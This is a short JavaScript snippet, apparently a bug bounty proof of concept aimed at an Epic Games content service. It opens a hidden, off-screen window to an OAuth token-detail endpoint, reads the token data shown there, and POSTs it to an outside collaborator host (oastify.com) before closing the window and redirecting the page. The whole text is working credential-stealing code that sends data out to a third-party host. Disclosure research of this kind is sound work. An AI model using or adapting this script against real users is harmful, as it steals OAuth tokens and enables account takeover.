(function() {
  const target = window.open('https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail','_blank','toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', ''); 
  target.addEventListener('DOMContentLoaded', () => {
    var data = target.document.querySelectorAll('pre')[0].firstChild.data;
    const headers = {'Access-Control-Allow-Origin': '*','X-Bug-Bounty': 'Hackerone-johnathanrs','Content-Type': 'application/json'};
    async function a() {
      const resp = await fetch('https://0tugjdbj0ttwwhya95u5u4sg97fy3qtei.oastify.com',{method:'POST',body:JSON.stringify(data), headers:headers})
      if (resp.ok) {
        target.close();
        window.location.href="https://content-service.bfda.live.use1a.on.epicgames.com";
      }
    }
    a();
    })
})();
